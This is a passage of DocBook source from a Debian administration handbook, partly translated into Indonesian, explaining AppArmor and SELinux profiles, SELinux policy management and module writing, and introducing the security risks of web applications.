        program in all the ways that it is legitimately used. In the case
        of dhclient, it means running it via Network Manager, running it via
        ifupdown, running it manually, etc. In the end, you might get
        a <filename>/etc/apparmor.d/sbin.dhclient</filename> close to this:
      </para>
      <programlisting>
# Last Modified: Tue Sep  8 21:40:02 2015
#include &lt;tunables/global&gt;

/sbin/dhclient {
  #include &lt;abstractions/base&gt;
  #include &lt;abstractions/nameservice&gt;

  capability net_bind_service,
  capability net_raw,

  /bin/dash r,
  /etc/dhcp/* r,
  /etc/dhcp/dhclient-enter-hooks.d/* r,
  /etc/dhcp/dhclient-exit-hooks.d/* r,
  /etc/resolv.conf.* w,
  /etc/samba/dhcp.conf.* w,
  /proc/*/net/dev r,
  /proc/filesystems r,
  /run/dhclient*.pid w,
  /sbin/dhclient mr,
  /sbin/dhclient-script rCx,
  /usr/lib/NetworkManager/nm-dhcp-helper Px,
  /var/lib/NetworkManager/* r,
  /var/lib/NetworkManager/*.lease rw,
  /var/lib/dhcp/*.leases rw,

  profile /sbin/dhclient-script flags=(complain) {
    #include &lt;abstractions/base&gt;
    #include &lt;abstractions/bash&gt;

    /bin/dash rix,
    /etc/dhcp/dhclient-enter-hooks.d/* r,
    /etc/dhcp/dhclient-exit-hooks.d/* r,
    /sbin/dhclient-script r,

  }
}
      </programlisting>
    </section>
  </section>

  <section id="sect.selinux">
    <title>Pengantar SELinux</title>
    <indexterm><primary>SELinux</primary></indexterm>
    <section id="sect.selinux-principles">
      <title>Prinsip-prinsip</title>

      <para>SELinux (<emphasis>Security Enhanced Linux</emphasis>) is a
      <emphasis>Mandatory Access Control</emphasis> system built on Linux's
      LSM (<emphasis>Linux Security Modules</emphasis>) interface. In
      practice, the kernel queries SELinux before each system call to know
      whether the process is authorized to do the given operation.</para>

      <para>SELinux menggunakan seperangkat aturan — secara kolektif dikenal sebagai <emphasis>kebijakan</emphasis> — untuk mengotorisasi atau melarang operasi. Aturan-aturan tersebut sulit untuk dibuat. Untungnya, dua kebijakan standar (<emphasis>targeted</emphasis> dan <emphasis>strict</emphasis>) disediakan untuk menghindari sebagian besar pekerjaan konfigurasi.</para>

      <para>Dengan SELinux, pengelolaan hak ini benar-benar berbeda dari sistem Unix tradisional. Hak-hak proses tergantung pada <emphasis>konteks keamanan</emphasis>. Konteks didefinisikan oleh <emphasis>identitas</emphasis> pengguna yang memulai proses, <emphasis>peran</emphasis> dan <emphasis>domain</emphasis> yang dibawa oleh pengguna saat itu. Hak benar-benar tergantung pada domain, tetapi transisi antara domain dikontrol oleh peran. Terakhir, transisi yang mungkin antar peran tergantung pada identitas.</para>

      <figure>
        <title>Konteks keamanan dan pengguna Unix</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-context.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>In practice, during login, the user gets assigned a default
      security context (depending on the roles that they should be able to
      endorse). This defines the current domain, and thus the domain that
      all new child processes will carry. If you want to change the current
      role and its associated domain, you must call <command>newrole -r
      <replaceable>role_r</replaceable> -t
      <replaceable>domain_t</replaceable></command> (there's usually only a
      single domain allowed for a given role, the <literal>-t</literal>
      parameter can thus often be left out). This command authenticates you
      by asking you to type your password. This feature forbids programs to
      automatically switch roles. Such changes can only happen if they are
      explicitly allowed in the SELinux policy.</para>

      <para>Tentu saja hak tidak berlaku untuk semua <emphasis>objek</emphasis> (berkas, direktori, soket, perangkat, dll). Mereka bisa bervariasi dari objek ke objek. Untuk mencapai hal ini, setiap objek dikaitkan dengan suatu <emphasis>tipe</emphasis> (ini dikenal sebagai pelabelan). Hak domain kemudian dinyatakan dengan set operasi yang (tidak) diizinkan pada tipe tersebut (dan, secara tidak langsung, pada semua objek yang dilabeli tipe tertentu).</para>

      <sidebar>
        <title><emphasis>EKSTRA</emphasis> Domain dan tipe adalah setara</title>

	<para>Internally, a domain is just a type, but a type that only
	applies to processes. That's why domains are suffixed with
	<literal>_t</literal> just like objects' types.</para>
      </sidebar>

      <para>By default, a program inherits its domain from the user who
      started it, but the standard SELinux policies expect many important
      programs to run in dedicated domains. To achieve this, those
      executables are labeled with a dedicated type (for example
      <command>ssh</command> is labeled with
      <literal>ssh_exec_t</literal>, and when the program starts, it
      automatically switches to the <literal>ssh_t</literal> domain). This
      automatic domain transition mechanism makes it possible to grant only
      the rights required by each program. It is a fundamental principle of
      SELinux.</para>

      <figure>
        <title>Transisi otomatis antar domain</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-transitions.png" scalefit="1" width="35%" />
          </imageobject>
        </mediaobject>
      </figure>

      <sidebar>
        <title><emphasis>IN PRACTICE</emphasis> Finding the security context</title>
        <indexterm><primary>konteks keamanan</primary></indexterm>
        <indexterm><primary>konteks, konteks keamanan</primary></indexterm>
        <indexterm><primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary></indexterm>

	<para>Untuk menemukan konteks keamanan proses tertentu, Anda harus menggunakan opsi <literal>Z</literal> dari <command>ps</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput></screen>

	<para>The first field contains the identity, the role, the domain
	and the MCS level, separated by colons. The MCS level
	(<emphasis>Multi-Category Security</emphasis>) is a parameter that
	intervenes in the setup of a confidentiality protection policy,
	which regulates the access to files based on their sensitivity.
	This feature will not be explained in this book.</para>

	<para>Untuk menemukan konteks keamanan saat ini di shell, Anda harus memanggil <command>id -Z</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput></screen>

	<para>Finally, to find the type assigned to a file, you can use
	<command>ls -Z</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
<computeroutput>unconfined_u:object_r:user_home_t:s0 test
     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput></screen>

	<para>It is worth noting that the identity and role assigned to a
	file bear no special importance (they are never used), but for the
	sake of uniformity, all objects get assigned a complete security
	context.</para>
      </sidebar>
    </section>
    <section id="sect.selinux-setup">
      <title>Menyiapkan SELinux</title>

      <para>SELinux support is built into the standard kernels provided by
      Debian. The core Unix tools support SELinux without any
      modifications. It is thus relatively easy to enable SELinux.</para>

      <para>Perintah <command>apt install selinux-basics selinux-policy-default</command> secara otomatis akan menginstal paket-paket yang diperlukan untuk mengkonfigurasi sistem SELinux.</para>

      <sidebar>
        <title><emphasis>CAUTION</emphasis> Reference policy not in jessie</title>
        <para>
          Unfortunately the maintainers of the <emphasis role="pkg">refpolicy</emphasis> source package did not handle
          release critical bugs on their package and the package got
          removed from jessie. This means that the <emphasis role="pkg">selinux-policy-*</emphasis> packages are currently not
          installable in jessie and need to be fetched from another
          place. Hopefully they will come back in one of the point releases
          or in jessie-backports. In the meantime, you can grab them
          from unstable.
        </para>
        <para>
          This sad situation at least proves that SELinux is not very popular
          in the set of users/developers who are running the development
          versions of Debian. Thus, if you opt to use SELinux, you
          should expect the default policy to not work perfectly and
          you will have to invest quite some time to make it suitable
          to your specific needs.
        </para>
      </sidebar>

      <para>The <emphasis role="pkg">selinux-policy-default</emphasis>
      package contains a set of standard rules. By default, this policy
      only restricts access for a few widely exposed services. The user
      sessions are not restricted and it is thus unlikely that SELinux
      would block legitimate user operations. However, this does enhance
      the security of system services running on the machine. To setup a
      policy equivalent to the old “strict” rules, you just have to
      disable the <literal>unconfined</literal> module (modules management
      is detailed further in this section).</para>

      <para>Once the policy has been installed, you should label all the
      available files (which means assigning them a type). This operation
      must be manually started with <command>fixfiles
      relabel</command>.</para>

      <para>The SELinux system is now ready. To enable it, you should add
      the <literal>selinux=1 security=selinux</literal> parameter to the Linux kernel. The
      <literal>audit=1</literal> parameter enables SELinux logging which
      records all the denied operations. Finally, the
      <literal>enforcing=1</literal> parameter brings the rules into
      application: without it SELinux works in its default
      <emphasis>permissive</emphasis> mode where denied actions are logged
      but still executed. You should thus modify the GRUB bootloader
      configuration file to append the desired parameters. One easy way to
      do this is to modify the <literal>GRUB_CMDLINE_LINUX</literal>
      variable in <filename>/etc/default/grub</filename> and to run
      <command>update-grub</command>. SELinux will be active after a
      reboot.</para>

      <para>It is worth noting that the <command>selinux-activate</command>
      script automates those operations and forces a labeling on next boot
      (which avoids new non-labeled files created while SELinux was not yet
      active and while the labeling was going on).</para>
    </section>
    <section id="sect.selinux-management">
      <title>Mengelola Sistem SELinux</title>
      <indexterm><primary><command>semodule</command></primary></indexterm>
      <indexterm><primary><command>semanage</command></primary></indexterm>

      <para>The SELinux policy is a modular set of rules, and its
      installation detects and enables automatically all the relevant
      modules based on the already installed services. The system is thus
      immediately operational. However, when a service is installed after
      the SELinux policy, you must be able to manually enable the
      corresponding module. That is the purpose of the
      <command>semodule</command> command. Furthermore, you must be able to
      define the roles that each user can endorse, and this can be done
      with the <command>semanage</command> command.</para>

      <para>Those two commands can thus be used to modify the current
      SELinux configuration, which is stored in
      <filename>/etc/selinux/default/</filename>. Unlike other
      configuration files that you can find in <filename>/etc/</filename>,
      all those files must not be changed by hand. You should use the
      programs designed for this purpose.</para>

      <sidebar>
        <title><emphasis>GOING FURTHER</emphasis> More documentation</title>

	<para>Since the NSA doesn't provide any official documentation, the
	community set up a wiki to compensate. It brings together a lot of
	information, but you must be aware that most SELinux contributors
	are Fedora users (where SELinux is enabled by default). The
	documentation thus tends to deal specifically with that
	distribution. <ulink type="block" url="http://www.selinuxproject.org" /></para>

	<para>You should also have a look at the dedicated Debian wiki page
	as well as Russell Coker's blog, who is one of the most active
	Debian developers working on SELinux support. <ulink type="block" url="http://wiki.debian.org/SELinux" /> <ulink type="block" url="http://etbe.coker.com.au/tag/selinux/" /></para>
      </sidebar>
      <section>
        <title>Mengelola Modul SELinux</title>

	<para>Available SELinux modules are stored in the
	<filename>/usr/share/selinux/default/</filename> directory. To
	enable one of these modules in the current configuration, you
	should use <command>semodule -i
	<replaceable>module.pp.bz2</replaceable></command>. The
	<emphasis>pp.bz2</emphasis> extension stands for <emphasis>policy
	package</emphasis> (compressed with bzip2).</para>

	<para>Removing a module from the current configuration is done with
	<command>semodule -r <replaceable>module</replaceable></command>.
	Finally, the <command>semodule -l</command> command lists the
	modules which are currently installed. It also outputs their version
        numbers. Modules can be selectively enabled with <command>semodule -e</command>
        and disabled with <command>semodule -d</command>.</para>

        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0   Disabled
accountsd       1.1.0   
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0
accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput></screen>

	<para><command>semodule</command> immediately loads the new
	configuration unless you use its <literal>-n</literal> option. It
	is worth noting that the program acts by default on the current
	configuration (which is indicated by the
	<literal>SELINUXTYPE</literal> variable in
	<filename>/etc/selinux/config</filename>), but that you can modify
	another one by specifying it with the <literal>-s</literal>
	option.</para>
      </section>
      <section>
        <title>Mengelola Identitas</title>

	<para>Every time that a user logs in, they get assigned an SELinux
	identity. This identity defines the roles that they will be able to
	endorse. Those two mappings (from the user to the identity and from
	this identity to roles) are configurable with the
	<command>semanage</command> command.</para>

	<para>You should definitely read the
	<citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry>
	manual page, even if the command's syntax tends to be similar for
	all the concepts which are managed. You will find common options to
	all sub-commands: <literal>-a</literal> to add,
	<literal>-d</literal> to delete, <literal>-m</literal> to modify,
	<literal>-l</literal> to list, and <literal>-t</literal> to
	indicate a type (or domain).</para>

	<para><command>semanage login -l</command> lists the current
	mapping between user identifiers and SELinux identities. Users that
	have no explicit entry get the identity indicated in the
	<literal>__default__</literal> entry. The <command>semanage login
	-a -s user_u <replaceable>user</replaceable></command> command will
	associate the <emphasis>user_u</emphasis> identity to the given
	user. Finally, <command>semanage login -d
	<replaceable>user</replaceable></command> drops the mapping entry
	assigned to this user.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
<computeroutput>
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         SystemLow-SystemHigh *
rhertzog             user_u               SystemLow            *
root                 unconfined_u         SystemLow-SystemHigh *
system_u             system_u             SystemLow-SystemHigh *
# </computeroutput><userinput>semanage login -d rhertzog</userinput> </screen>

	<para><command>semanage user -l</command> lists the mapping between
	SELinux user identities and allowed roles. Adding a new identity
	requires to define both the corresponding roles and a labeling
	prefix which is used to assign a type to personal files
	(<filename>/home/<replaceable>user</replaceable>/*</filename>). The
	prefix must be picked among <literal>user</literal>,
	<literal>staff</literal>, and <literal>sysadm</literal>. The
	“<literal>staff</literal>” prefix results in files of type
	“<literal>staff_home_dir_t</literal>”. Creating a new SELinux
	user identity is done with <command>semanage user -a -R
	<replaceable>roles</replaceable> -P
	<replaceable>prefix</replaceable>
	<replaceable>identity</replaceable></command>. Finally, you can
	remove an SELinux user identity with <command>semanage user -d
	<replaceable>identity</replaceable></command>.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
<computeroutput>
                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles

root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
system_u        user       SystemLow  SystemLow-SystemHigh  system_r
test_u          staff      SystemLow  SystemLow             staff_r user_r
unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
user_u          user       SystemLow  SystemLow             user_r
# </computeroutput><userinput>semanage user -d test_u</userinput></screen>
      </section>
      <section>
        <title>Managing File Contexts, Ports and Booleans</title>

	<para>Each SELinux module provides a set of file labeling rules,
	but it is also possible to add custom labeling rules to cater to a
	specific case. For example, if you want the web server to be able
	to read files within the <filename>/srv/www/</filename> file
	hierarchy, you could execute <command>semanage fcontext -a -t
	httpd_sys_content_t "/srv/www(/.*)?"</command> followed by
	<command>restorecon -R /srv/www/</command>. The former command
	registers the new labeling rules and the latter resets the file
	types according to the current labeling rules.</para>

	<para>Similarly, TCP/UDP ports are labeled in a way that ensures
	that only the corresponding daemons can listen to them. For
	instance, if you want the web server to be able to listen on port
	8080, you should run <command>semanage port -m -t http_port_t -p
	tcp 8080</command>.</para>

	<para>Some SELinux modules export boolean options that you can
	tweak to alter the behavior of the default rules. The
	<command>getsebool</command> utility can be used to inspect those
	options (<command>getsebool
	<replaceable>boolean</replaceable></command> displays one option,
	and <command>getsebool -a</command> them all). The
	<command>setsebool <replaceable>boolean</replaceable>
	<replaceable>value</replaceable></command> command changes the
	current value of a boolean option. The <literal>-P</literal> option
	makes the change permanent, it means that the new value becomes the
	default and will be kept across reboots. The example below grants
	web servers an access to home directories (this is useful when
	users have personal websites in
	<filename>~/public_html/</filename>).</para>

        <screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
<computeroutput>httpd_enable_homedirs --&gt; off
# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput></screen>
      </section>
    </section>
    <section id="sect.selinux-custom-rules">
      <title>Mengadaptasi Aturan</title>

      <para>Since the SELinux policy is modular, it might be interesting to
      develop new modules for (possibly custom) applications that lack
      them. These new modules will then complete the <emphasis>reference
      policy</emphasis>.</para>

      <para>To create new modules, the <emphasis role="pkg">selinux-policy-dev</emphasis> package is required, as well
      as <emphasis role="pkg">selinux-policy-doc</emphasis>. The latter
      contains the documentation of the standard rules
      (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) and
      sample files that can be used as templates to create new modules.
      Install those files and study them more closely:</para>

      <screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput></screen>

      <para>The <filename>.te</filename> file is the most important one. It
      defines the rules. The <filename>.fc</filename> file defines the
      “file contexts”, that is the types assigned to files related to
      this module. The data within the <filename>.fc</filename> file are
      used during the file labeling step. Finally, the
      <filename>.if</filename> file defines the interface of the module:
      it is a set of “public functions” that other modules can use to
      properly interact with the module that you're creating.</para>
      <section>
        <title>Writing a <filename>.fc</filename> file</title>

	<para>Reading the below example should be sufficient to understand
	the structure of such a file. You can use regular expressions to
	assign the same security context to multiple files, or even an
	entire directory tree.</para>

        <example>
          <title><filename>example.fc</filename> file</title>

          <programlisting role="scale"># myapp executable will have:
# label: system_u:object_r:myapp_exec_t
# MLS sensitivity: s0
# MCS categories: &lt;none&gt;

/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)</programlisting>
        </example>
      </section>
      <section>
        <title>Writing a <filename>.if</filename> File</title>

	<para>In the sample below, the first interface
	(“<literal>myapp_domtrans</literal>”) controls who can execute
	the application. The second one
	(“<literal>myapp_read_log</literal>”) grants read rights on the
	application's log files.</para>

	<para>Each interface must generate a valid set of rules which can
	be embedded in a <filename>.te</filename> file. You should thus
	declare all the types that you use (with the
	<literal>gen_require</literal> macro), and use standard directives
	to grant rights. Note, however, that you can use interfaces
	provided by other modules. The next section will give more
	explanations about how to express those rights.</para>

        <example>
          <title><filename>example.if</filename> File</title>

          <programlisting>## &lt;summary&gt;Myapp example policy&lt;/summary&gt;
## &lt;desc&gt;
##      &lt;p&gt;
##              More descriptive text about myapp.  The &lt;desc&gt;
##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;
##              html tags for formatting.
##      &lt;/p&gt;
##      &lt;p&gt;
##              This policy supports the following myapp features:
##              &lt;ul&gt;
##              &lt;li&gt;Feature A&lt;/li&gt;
##              &lt;li&gt;Feature B&lt;/li&gt;
##              &lt;li&gt;Feature C&lt;/li&gt;
##              &lt;/ul&gt;
##      &lt;/p&gt;
## &lt;/desc&gt;
#

########################################
## &lt;summary&gt;
##      Execute a domain transition to run myapp.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to transition.
## &lt;/param&gt;
#
interface(`myapp_domtrans',`
        gen_require(`
                type myapp_t, myapp_exec_t;
        ')

        domtrans_pattern($1,myapp_exec_t,myapp_t)
')

########################################
## &lt;summary&gt;
##      Read myapp log files.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to read the log files.
## &lt;/param&gt;
#
interface(`myapp_read_log',`
        gen_require(`
                type myapp_log_t;
        ')

        logging_search_logs($1)
        allow $1 myapp_log_t:file r_file_perms;
')</programlisting>
        </example>

        <sidebar>
          <title><emphasis>DOCUMENTATION</emphasis> Explanations about the <emphasis>reference policy</emphasis></title>

	  <para>The <emphasis>reference policy</emphasis> evolves like any
	  free software project: based on volunteer contributions. The
	  project is hosted by Tresys, one of the most active companies in
	  the SELinux field. Their wiki contains explanations on how the
	  rules are structured and how you can create new ones. <ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" /></para>
        </sidebar>
      </section>
      <section id="sect.writing-a-te-file">
        <title>Writing a <filename>.te</filename> File</title>

	<para>Have a look at the <filename>example.te</filename>
	file:</para>

        <sidebar>
          <title><emphasis>GOING FURTHER</emphasis> The <command>m4</command> macro language</title>

	  <para>To properly structure the policy, the SELinux developers
	  used a macro-command processor. Instead of duplicating many
	  similar <emphasis>allow</emphasis> directives, they created
	  “macro functions” to use a higher-level logic, which also
	  results in a much more readable policy.</para>

	  <para>In practice, <command>m4</command> is used to compile those
	  rules. It does the opposite operation: it expands all those
	  high-level directives into a huge database of
	  <emphasis>allow</emphasis> directives.</para>

	  <para>The SELinux “interfaces” are only macro functions which
	  will be substituted by a set of rules at compilation time.
	  Likewise, some rights are in fact sets of rights which are
	  replaced by their values at compilation time.</para>
        </sidebar>

        <programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>

########################################
#
# Declarations
#

type myapp_t; <co id="example.te.type"></co>
type myapp_exec_t;
domain_type(myapp_t)
domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"></co>

type myapp_log_t;
logging_log_file(myapp_log_t) <co id="example.te.interface"></co>

type myapp_tmp_t;
files_tmp_file(myapp_tmp_t)

########################################
#
# Myapp local policy
#

allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>

allow myapp_t myapp_tmp_t:file manage_file_perms;
files_tmp_filetrans(myapp_t,myapp_tmp_t,file)</programlisting>
        <calloutlist>
          <callout arearefs="example.te.module">
	    <para>The module must be identified by its name and version
	    number. This directive is required.</para>
          </callout>
          <callout arearefs="example.te.type">
	    <para>If the module introduces new types, it must declare them
	    with directives like this one. Do not hesitate to create as
	    many types as required rather than granting too many useless
	    rights.</para>
          </callout>
          <callout arearefs="example.te.domain">
	    <para>Those interfaces define the <literal>myapp_t</literal>
	    type as a process domain that should be used by any executable
	    labeled with <literal>myapp_exec_t</literal>. Implicitly, this
	    adds an <literal>exec_type</literal> attribute on those
	    objects, which in turn allows other modules to grant rights to
	    execute those programs: for instance, the
	    <literal>userdomain</literal> module allows processes with
	    domains <literal>user_t</literal>, <literal>staff_t</literal>,
	    and <literal>sysadm_t</literal> to execute them. The domains of
	    other confined applications will not have the rights to execute
	    them, unless the rules grant them similar rights (this is the
	    case, for example, of <command>dpkg</command> with its
	    <literal>dpkg_t</literal> domain).</para>
          </callout>
          <callout arearefs="example.te.interface">
	    <para><literal>logging_log_file</literal> is an interface
	    provided by the reference policy. It indicates that files
	    labeled with the given type are log files which ought to
	    benefit from the associated rules (for example granting rights
	    to <command>logrotate</command> so that it can manipulate
	    them).</para>
          </callout>
          <callout arearefs="example.te.allow">
	    <para>The <literal>allow</literal> directive is the base
	    directive used to authorize an operation. The first parameter
	    is the process domain which is allowed to execute the
	    operation. The second one defines the object that a process of
	    the former domain can manipulate. This parameter is of the form
	    “<replaceable>type</replaceable>:<replaceable>class</replaceable>“
	    where <replaceable>type</replaceable> is its SELinux type and
	    <replaceable>class</replaceable> describes the nature of the
	    object (file, directory, socket, fifo, etc.). Finally, the last
	    parameter describes the permissions (the allowed
	    operations).</para>

	    <para>Permissions are defined as the set of allowed operations
	    and follow this template: <literal>{
	    <replaceable>operation1</replaceable>
	    <replaceable>operation2</replaceable> }</literal>. However, you
	    can also use macros representing the most useful permissions.
	    The
	    <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename>
	    lists them.</para>

	    <para>Halaman web berikut menyediakan daftar relatif lengkap dari kelas objek, dan izin yang dapat diberikan. <ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" /></para>
          </callout>
        </calloutlist>

	<para>Now you just have to find the minimal set of rules required
	to ensure that the target application or service works properly. To
	achieve this, you should have a good knowledge of how the
	application works and of what kind of data it manages and/or
	generates.</para>

	<para>However, an empirical approach is possible. Once the
	relevant objects are correctly labeled, you can use the
	application in permissive mode: the operations that would be
	forbidden are logged but still succeed. By analyzing the logs, you
	can now identify the operations to allow. Here is an example of
	such a log entry:</para>

        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1</programlisting>

	<para>Untuk lebih memahami pesan ini, marilah kita pelajari sepotong demi sepotong.</para>

        <table colsep="1">
          <title>Analisis jejak SELinux</title>
          <tgroup cols="2">
            <thead>
              <row>
                <entry>Pesan</entry>
                <entry>Deskripsi</entry>
              </row>
            </thead>
            <tbody>
              <row>
                <entry><computeroutput>avc: denied</computeroutput></entry>
                <entry>Operasi telah ditolak.</entry>
              </row>
              <row>
                <entry><computeroutput>{ read write }</computeroutput></entry>
                <entry>Operasi ini memerlukan izin <literal>read</literal> dan <literal>write</literal>.</entry>
              </row>
              <row>
                <entry><computeroutput>pid=1876</computeroutput></entry>
                <entry>Proses dengan PID 1876 menjalankan operasi (atau mencoba untuk menjalankannya).</entry>
              </row>
              <row>
                <entry><computeroutput>comm="syslogd"</computeroutput></entry>
                <entry>Proses adalah instance dari program <literal>syslogd</literal>.</entry>
              </row>
              <row>
                <entry><computeroutput>name="xconsole"</computeroutput></entry>
                <entry>Objek target dinamai <literal>xconsole</literal>. Kadang-kadang Anda dapat juga memiliki variabel "path" — dengan path lengkap — sebagai pengganti.</entry>
              </row>
              <row>
                <entry><computeroutput>dev=tmpfs</computeroutput></entry>
                <entry>The device hosting the target object is a <literal>tmpfs</literal> (an in-memory filesystem). For a real disk, you could see the partition hosting the object (for example: “sda3”).</entry>
              </row>
              <row>
                <entry><computeroutput>ino=5510</computeroutput></entry>
                <entry>Objek diidentifikasi oleh nomor inode 5510.</entry>
              </row>
              <row>
                <entry><computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput></entry>
                <entry>Ini adalah konteks keamanan dari proses yang menjalankan operasi.</entry>
              </row>
              <row>
                <entry><computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput></entry>
                <entry>Ini adalah konteks keamanan objek target.</entry>
              </row>
              <row>
                <entry><computeroutput>tclass=fifo_file</computeroutput></entry>
                <entry>Objek target adalah suatu berkas FIFO.</entry>
              </row>
            </tbody>
          </tgroup>
        </table>

	<para>By observing this log entry, it is possible to build a rule
	that would allow this operation. For example: <literal>allow
	syslogd_t device_t:fifo_file { read write }</literal>. This process
	can be automated, and it's exactly what the
	<command>audit2allow</command> command (of the <emphasis role="pkg">policycoreutils</emphasis> package) offers. This
	approach is only useful if the various objects are already
	correctly labeled according to what must be confined. In any case,
	you will have to carefully review the generated rules and validate
	them according to your knowledge of the application. Effectively,
	this approach tends to grant more rights than are really required.
	The proper solution is often to create new types and to grant
	rights on those types only. It also happens that a denied operation
	isn't fatal to the application, in which case it might be better to
	just add a “<literal>dontaudit</literal>” rule to avoid the log
	entry despite the effective denial.</para>

        <sidebar>
          <title><emphasis>COMPLEMENTS</emphasis> No roles in policy rules</title>
          <indexterm><primary>Penegakan Tipe</primary></indexterm>
          <indexterm><primary>Penegakan, Penegakan Tipe</primary></indexterm>

	  <para>It might seem weird that roles do not appear at all when
	  creating new rules. SELinux uses only the domains to find out
	  which operations are allowed. The role intervenes only indirectly
	  by allowing the user to switch to another domain. SELinux is
	  based on a theory known as <emphasis>Type Enforcement</emphasis>
	  and the type is the only element that matters when granting
	  rights.</para>
        </sidebar>
      </section>
      <section>
        <title>Mengkompilasi Berkas</title>

	<para>Once the 3 files (<filename>example.if</filename>,
	<filename>example.fc</filename>, and
	<filename>example.te</filename>) match your expectations for the
	new rules, just run <command>make NAME=devel</command> to generate a module in
	the <filename>example.pp</filename> file (you can immediately load
	it with <command>semodule -i example.pp</command>). If several
	modules are defined, <command>make</command> will create all the
	corresponding <filename>.pp</filename> files.</para>
      </section>
    </section>
  </section>
  <section id="sect.other-security-considerations">
    <title>Pertimbangan Lain Terkait Keamanan</title>

    <para>Security is not just a technical problem; more than anything,
    it is about good practices and understanding the risks. This section
    reviews some of the more common risks, as well as a few best practices
    which should, depending on the case, increase security or lessen the
    impact of a successful attack.</para>
    <section>
      <title>Risiko Inheren Aplikasi Web</title>

      <para>The universal character of web applications led to their
      proliferation. Several are often run in parallel: a webmail, a wiki,
      some groupware system, forums, a photo gallery, a blog, and so on.
      Many of those applications rely on the “LAMP” (<emphasis>Linux,
      Apache, MySQL, PHP</emphasis>) stack. Unfortunately, many of those
      applications were also written without much consideration for
      security problems. Data coming from outside is, too often, used with
      little or no validation. Providing specially-crafted values can be
      used to subvert a call to a command so that another one is executed
      instead. Many of the most obvious problems have been fixed as time
      has passed, but new security problems pop up regularly.</para>

      <sidebar>
        <title><emphasis>KOSAKATA</emphasis> Injeksi SQL</title>

	<para>When a program inserts data into SQL queries in an insecure
	manner, it becomes vulnerable to SQL injections; this name covers
	the act of changing a parameter in such a way that the actual query
	executed by the program is different from the intended one, either
	to damage the database or to access data that should normally not
	be accessible. <ulink type="block" url="http://en.wikipedia.org/wiki/SQL_Injection" /></para>
        <indexterm><primary>Injeksi SQL</primary></indexterm>
      </sidebar>

      <para>Updating web applications regularly is therefore a must, lest
      any cracker (whether a professional attacker or a script kiddy) can
      exploit a known vulnerability. The actual risk depends on the case,
      and ranges from data destruction to arbitrary code execution,
      including web site defacement.</para>
    </section>
    <section>
      <title>Mengetahui Apa Yang Diharapkan</title>

      <para>A vulnerability in a web application is often used as a
      starting point for cracking attempts. What follows is a short review
      of possible consequences.</para>

      <sidebar>
        <title><emphasis>LIHAT CEPAT</emphasis> Memfilter kueri HTTP</title>

	<para>Apache 2 includes modules allowing filtering incoming HTTP
